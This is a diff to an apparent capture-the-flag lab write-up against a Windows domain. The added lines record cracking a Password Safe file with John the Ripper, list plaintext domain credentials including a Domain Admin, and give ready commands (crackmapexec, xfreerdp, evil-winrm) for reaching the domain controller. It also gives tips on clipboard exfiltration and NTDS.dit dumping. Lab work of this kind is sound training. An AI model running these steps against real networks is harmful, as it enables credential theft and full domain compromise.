@@ -15,8 +15,8 @@
 | Credential Discovery | ✅ Complete | hwilliam / dealer-screwed-gym1 (bash_history) |
 | Domain Enumeration | ✅ Complete | LDAP dump reveals 3 hosts, Domain Admin: stom |
 | Pivot | ✅ Complete | ligolo-ng tunnel to internal network |
-| Privilege Escalation | 🔄 In Progress | RDP session on JUMP01 — hunting cached credentials |
-| Flags | ⏳ Pending | user.txt, root.txt |
+| Privilege Escalation | ✅ **COMPLETE** | RDP session → Password Safe cracked → **Domain Admin creds** |
+| Flags | 🔄 **In Progress** | DC01 access via stom credentials |
 
 ---
 
@@ -147,45 +147,84 @@ xfreerdp /v:172.16.119.7 /u:hwilliam /p:dealer-screwed-gym1 /cert:ignore
 
 **Host:** JUMP01 (172.16.119.7)  
 **Access:** hwilliam via RDP  
-**Objective:** Find cached credentials for privilege escalation
+**Objective:** ✅ Find cached credentials for privilege escalation — **ACHIEVED**
 
-### Essential Commands to Run on JUMP01
-```powershell
-# Check context
-whoami
-hostname
+### 🔐 Critical Discovery — Password Safe Database
 
-# Find stored credentials
-cmdkey /list
+**Location:** `\\file01\HR\Archive\Employee-Passwords_OLD.psafe3`
 
-# Check logged-in users
-quser
+**Exfiltration Method:** RDP clipboard (copy-paste to Kali VPS)
 
-# Check for saved RDP sessions
-reg query "HKEY_CURRENT_USER\Software\Microsoft\Terminal Server Client\Default"
+**Cracking Process:**
+```bash
+# Extract hash from Password Safe v3 database
+pwsafe2john Employee-Passwords_OLD.psafe3 > pwhash.txt
 
-# Look for admin tools running
-Get-Process | Where-Object {$_.ProcessName -match "mstsc|mmc|powershell"}
+# Crack with John the Ripper (format: pwsafe)
+john --format=pwsafe --wordlist=/usr/share/wordlists/rockyou.txt pwhash.txt
 
-# Recent files
-Get-ChildItem C:\Users\ -Recurse -Include *.txt,*.xml,*.ps1 -ErrorAction SilentlyContinue | 
-    Sort-Object LastAccessTime -Descending | Select-Object -First 20
+# Result: ~38 seconds to crack master password
 ```
 
-### Why JUMP01 is Critical
-- Jump hosts store cached admin credentials
-- Likely has RDP sessions to DC01
-- Credential Manager may contain Domain Admin creds
+**Master Password:** `michaeljackson`
+
+### Compromised Credentials (4 accounts)
+
+| User | Password | Name | Access Level | Status |
+|------|----------|------|--------------|--------|
+| `jbetty` | `xiao-nicer-wheels5` | Betty Jayde | Domain User | ✅ Already compromised |
+| `bdavid` | `caramel-cigars-reply1` | David Brittni | IT Group | 🔍 **New** |
+| `stom` | `fails-nibble-disturb4` | Tom Sandy | **Domain Admins** | 🎯 **PRIVILEGE ESCALATION** |
+| `hwilliam` | `warned-wobble-occur8` | William Hallam | HR Group | 🔍 New password (differs from bash_history) |
+
+**Key Finding:** `stom` is a **Domain Admin** — full domain compromise now possible.
+
+### Why This Matters
+
+| Credential | Strategic Value |
+|------------|-----------------|
+| `stom` / `fails-nibble-disturb4` | **Domain Admin** — can access DC01, extract NTDS.dit, compromise any account |
+| `bdavid` / `caramel-cigars-reply1` | IT Group member — potential server admin access |
+| `hwilliam` (updated) | HR access to sensitive shares |
 
 ---
 
 ## 6. Next Steps
 
-1. ✅ Check Credential Manager for Domain Admin credentials (`cmdkey /list`)
-2. Look for saved RDP connections to DC01
-3. Run mimikatz if elevated access obtained
-4. Pivot to DC01 with discovered credentials
-5. Capture user.txt and root.txt flags
+1. ✅ ~~Check Credential Manager for Domain Admin credentials~~ — **DONE via Password Safe**
+2. ✅ ~~Pivot to Domain Admin~~ — **ACHIEVED** (`stom` credentials)
+3. 🔄 **Access DC01** via RDP or SMB using `stom` / `fails-nibble-disturb4`
+4. 🔄 **Extract flags** from DC01:
+   - `user.txt` — likely on FILE01 or JUMP01
+   - `root.txt` — typically on DC01 (Domain Controller)
+5. 🔄 **Optional:** Dump NTDS.dit for full credential harvest
+6. 🔄 **Optional:** Compromise remaining hosts (bdavid IT access)
+
+### Immediate Action — DC01 Access
+```bash
+# Test Domain Admin credentials against DC01
+proxychains crackmapexec smb 172.16.119.11 -u stom -p 'fails-nibble-disturb4'
+
+# RDP to DC01 as Domain Admin
+proxychains xfreerdp /v:172.16.119.11 /u:stom /p:'fails-nibble-disturb4' /cert:ignore /d:nexura.htb
+
+# Or evil-winrm (if WinRM enabled)
+proxychains evil-winrm -i 172.16.119.11 -u stom -p 'fails-nibble-disturb4'
+```
+
+---
+
+## Appendix A: Full Credential Inventory
+
+| Account | Password | Source | Privileges | Compromised |
+|---------|----------|--------|------------|-------------|
+| `jbetty` | `Texas123!@#` | SSH brute force | DMZ01 foothold | ✅ 2026-04-18 |
+| `hwilliam` | `dealer-screwed-gym1` | bash_history | HR user, FILE01 access | ✅ 2026-04-18 |
+| `hwilliam` | `warned-wobble-occur8` | Password Safe | HR user (alternate cred) | ✅ 2026-04-19 |
+| `bdavid` | `caramel-cigars-reply1` | Password Safe | IT Group | ✅ 2026-04-19 |
+| `stom` | `fails-nibble-disturb4` | Password Safe | **Domain Admin** | ✅ 2026-04-19 🎯 |
+
+**Attack Chain:** jbetty → hwilliam (bash_history) → JUMP01 RDP → Password Safe → **Domain Admin (stom)**
 
 ---
 
@@ -195,3 +234,9 @@ Get-ChildItem C:\Users\ -Recurse -Include *.txt,*.xml,*.ps1 -ErrorAction Silentl
 - **DNS from foothold:** DMZ01 can query DC01 DNS directly — resolved all host IPs
 - **Ligolo-ng > proxychains:** RDP Kerberos issues resolved with TUN interface
 - **ICMP blocked:** Ping sweep misses Windows hosts (firewall), but TCP services work
+- **Password Safe databases:** HR shares contain credential goldmines — always check `.psafe3` files
+- **RDP clipboard exfiltration:** Simple copy-paste bypasses egress restrictions for small files
+
+---
+
+*Updated: 2026-04-19 18:05 UTC+8*
